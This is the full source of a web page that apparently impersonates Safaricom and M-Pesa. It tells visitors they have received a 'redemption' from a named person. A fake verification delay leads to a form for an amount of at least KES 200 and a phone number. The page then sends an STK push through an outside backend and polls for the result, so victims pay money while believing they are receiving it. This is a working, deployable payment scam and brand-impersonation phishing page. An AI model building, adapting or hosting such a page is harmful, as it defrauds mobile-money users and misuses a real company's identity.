
<!DOCTYPE html>
<html lang="en">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>Safaricom Redemption</title>  
    <style>  
        body {  
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;  
            background: #121212;  
            display: flex;  
            justify-content: center;  
            align-items: center;  
            min-height: 100vh;  
            margin: 0;  
            color: #ffffff;
        }  
        .card {  
            background: #1e1e1e;  
            padding: 2.2rem 1.8rem;  
            border-radius: 16px;  
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);  
            max-width: 380px;  
            width: 90%;  
            text-align: center;  
            border: 1px solid #2a2a2a;
        }  
        .brand-header {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 25px;
        }
        .header-divider {
            color: #555;
            font-size: 1.2rem;
            font-weight: 300;
        }
        .icon-circle {
            width: 64px;
            height: 64px;
            background: #0f381e;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px auto;
        }
        .icon-circle svg {
            width: 32px;
            height: 32px;
            fill: #00d053;
        }
        h2 {   
            color: #ffffff;   
            margin-bottom: 0.8rem;   
            font-size: 1.35rem;   
            line-height: 1.3;   
            font-weight: 700;
        }  
        .highlight-name {
            color: #00d053;
        }
        p.subtitle {   
            color: #a0a0a0;   
            margin-bottom: 1.8rem;   
            font-size: 0.95rem;
            line-height: 1.4;
        }  
        .input-group {  
            margin: 18px 0;  
            text-align: left;  
        }  
        label {  
            display: block;  
            margin-bottom: 8px;  
            font-weight: 600;  
            color: #ffffff;  
            font-size: 0.95rem;  
        }  
        input {  
            width: 100%;  
            padding: 14px;  
            background: #121212;
            border: 1px solid #333333;  
            border-radius: 8px;  
            font-size: 1.1rem;  
            color: #ffffff;
            box-sizing: border-box;  
            outline: none;
            transition: border-color 0.2s;
        }  
        input:focus {
            border-color: #00d053;
        }
        .amount-input {  
            font-size: 1.3rem;  
            font-weight: 600;  
            color: #00d053;  
            text-align: center;  
        }  
        .amount-input::placeholder {
            color: #555;
            font-size: 1.05rem;
            font-weight: normal;
        }
        button {  
            width: 100%;  
            padding: 15px;  
            background: #00b047;  
            color: white;  
            border: none;  
            border-radius: 8px;  
            font-size: 1.1rem;  
            font-weight: 700;  
            cursor: pointer;  
            margin-top: 10px;  
            transition: background 0.2s;
        }  
        button:hover {
            background: #00c952;
        }
        button:disabled {   
            background: #333333;   
            color: #777777;
            cursor: not-allowed;   
        }  
        #status {  
            margin-top: 20px;  
            padding: 12px;  
            border-radius: 8px;  
            min-height: 20px;  
            font-size: 0.92rem;  
            line-height: 1.45;  
        }  
        .success { background: rgba(0, 208, 83, 0.15); color: #00d053; border: 1px solid #00d053; }  
        .error { background: rgba(220, 53, 69, 0.15); color: #ff4d4d; border: 1px solid #ff4d4d; }  
        .info { background: rgba(0, 112, 186, 0.15); color: #3399ff; border: 1px solid #3399ff; }  
        .hidden { display: none; }
        .loader {  
            display: inline-block; width: 18px; height: 18px;  
            border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff;  
            border-radius: 50%; animation: spin 1s linear infinite;  
            margin-right: 8px; vertical-align: middle;  
        }  
        @keyframes spin { to { transform: rotate(360deg); } }  
    </style>  
</head>  
<body>  
<div class="card">  
    <!-- Header Logos -->
    <div class="brand-header">
        <svg height="24" viewBox="0 0 120 30" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M15 5 C5 5 0 12 0 18 C0 24 6 28 16 28 C26 28 30 22 30 18 C28 8 18 5 15 5 Z" fill="#E11B22"/>
            <text x="35" y="21" fill="#FFFFFF" font-family="sans-serif" font-weight="bold" font-size="16">Safaricom</text>
        </svg>
        <span class="header-divider">|</span>
        <svg height="24" viewBox="0 0 100 30" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="2" y="2" width="20" height="26" rx="4" fill="#00D053"/>
            <text x="27" y="21" fill="#00D053" font-family="sans-serif" font-weight="bold" font-size="16">M-PESA</text>
        </svg>
    </div>

    <!-- STEP 1: INITIAL PHONE ENTRY SCREEN -->
    <div id="step1">
        <h2>Enter Safaricom Number</h2>
        <p class="subtitle">Please enter your Safaricom phone number to check available redemption.</p>
        
        <div class="input-group">  
            <label for="initialPhone">Safaricom Phone Number</label>  
            <input type="text" id="initialPhone" placeholder="0712345678" maxlength="12" inputmode="numeric">  
        </div>  
        <button id="askBtn" onclick="handleInitialCheck()">Ask Redemption</button>  
    </div>

    <!-- STEP 2: REDEMPTION VIEW (Matches design image) -->
    <div id="step2" class="hidden">
        <div class="icon-circle">
            <svg viewBox="0 0 24 24">
                <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14zm-1-6h-3V8h-2v5H8l4 4 4-4z"/>
            </svg>
        </div>

        <h2>You've received a redemption from <span class="highlight-name">Gemma Francis</span> on your Safaricom line.</h2>  
        <p class="subtitle">Enter the amount below and the M-Pesa phone number used to redeem the money.</p>  

        <div class="input-group">  
            <label for="amount">Amount (KES)</label>  
            <input type="text" id="amount" class="amount-input" placeholder="Enter amount from 200" maxlength="6" inputmode="decimal">  
        </div>  

        <div class="input-group">  
            <label for="phone">M-Pesa Phone Number</label>  
            <input type="text" id="phone" placeholder="0712345678" maxlength="12" inputmode="numeric">  
        </div>  

        <button id="payBtn" onclick="handlePayment()">Pay with M-Pesa</button>  
    </div>

    <div id="status"></div>
</div>  

<script>  
    const BACKEND_URL = "https://tilo-three.vercel.app";  
    let pollTimer = null;  
  
    function showStatus(message, type = "info") {  
        const div = document.getElementById('status');  
        div.className = type;  
        div.innerHTML = message;  
    }  

    // Step 1: Initial verification
    function handleInitialCheck() {
        const phone = document.getElementById('initialPhone').value.trim();
        if (!phone || phone.length < 9) {
            showStatus("❌ Please enter a valid Safaricom phone number", "error");
            return;
        }

        const askBtn = document.getElementById('askBtn');
        askBtn.disabled = true;
        askBtn.innerHTML = '<span class="loader"></span> Checking...';

        setTimeout(() => {
            // Auto-fill phone field in step 2 with the entered number
            document.getElementById('phone').value = phone;
            
            showStatus(""); // clear status
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
        }, 1200);
    }

    function resetButton() {  
        const btn = document.getElementById('payBtn');  
        if (btn) {
            btn.disabled = false;  
            btn.innerText = "Pay with M-Pesa";  
        }
    }  
  
    // Sanitize amount field input
    function formatAmountInput() {  
        const amountInput = document.getElementById('amount');  
        amountInput.addEventListener('input', function() {  
            let value = this.value.replace(/[^0-9.]/g, '');  
            const parts = value.split('.');  
            if (parts.length > 2) value = parts[0] + '.' + parts.slice(1).join('');  
            if (parts.length === 2) value = parts[0] + '.' + parts[1].substring(0, 2);  
            this.value = value;  
        });  
    }  
  
    // Step 2: Payment Execution
    async function handlePayment() {  
        const phone = document.getElementById('phone').value.trim();  
        let amount = parseFloat(document.getElementById('amount').value);  
        const btn = document.getElementById('payBtn');  
  
        if (!phone || phone.length < 9) {
            showStatus("❌ Please enter a valid phone number", "error");
            return;
        }

        if (isNaN(amount) || amount < 200) {  
            showStatus("❌ Minimum redemption amount is KES 200.", "error");  
            return;  
        }  
  
        btn.disabled = true;  
        btn.innerHTML = '<span class="loader"></span> Sending STK Push...';  
        showStatus("STK Push sent.<br>Check your phone and enter M-Pesa PIN.", "info");  
  
        try {  
            const res = await fetch(`${BACKEND_URL}/api/stk-push`, {  
                method: "POST",  
                headers: {  
                    "Content-Type": "application/json",  
                    "ngrok-skip-browser-warning": "true"  
                },  
                body: JSON.stringify({   
                    amount: amount,   
                    phone_number: phone   
                })  
            });  
  
            const data = await res.json();  
            if (data.success) {  
                startPolling();  
            } else {  
                showStatus("❌ Failed to start payment", "error");  
                resetButton();  
            }  
        } catch (err) {  
            showStatus("❌ Connection error. Please try again.", "error");  
            resetButton();  
        }  
    }  
  
    function startPolling() {  
        let attempts = 0;  
        const maxAttempts = 50;  
  
        if (pollTimer) clearInterval(pollTimer);  
  
        pollTimer = setInterval(async () => {  
            attempts++;  
            try {  
                const res = await fetch(`${BACKEND_URL}/api/status`, {  
                    headers: { "ngrok-skip-browser-warning": "true" }  
                });  
                const data = await res.json();  
  
                if (data.status === true && data.response) {  
                    const code = data.response.ResultCode;  
  
                    if (code === 0) {  
                        clearInterval(pollTimer);  
                        showStatus("<strong>✅ Payments received, wait for verification.</strong>", "success");  
                        document.getElementById('payBtn').style.display = 'none';
                        return;  
                    } else if (code === 1032) {  
                        clearInterval(pollTimer);  
                        showStatus("❌ Payment was cancelled.<br>Please try again.", "error");  
                        resetButton();  
                        return;  
                    } else {  
                        clearInterval(pollTimer);  
                        let msg = data.response.ResultDesc || "Payment failed";  
                        if (code === 2001) msg = "Wrong M-Pesa PIN entered.";  
                        showStatus(`❌ ${msg}`, "error");  
                        resetButton();  
                        return;  
                    }  
                }  
  
                if (attempts >= maxAttempts) {  
                    clearInterval(pollTimer);  
                    showStatus("⏰ Request timed out.<br>Check your M-Pesa or try again.", "error");  
                    resetButton();  
                }  
            } catch (err) {  
                console.error("Polling error:", err);  
            }  
        }, 3000);  
    }  
  
    window.onload = function() {  
        formatAmountInput();  
    };  
</script>  
</body>  
</html>
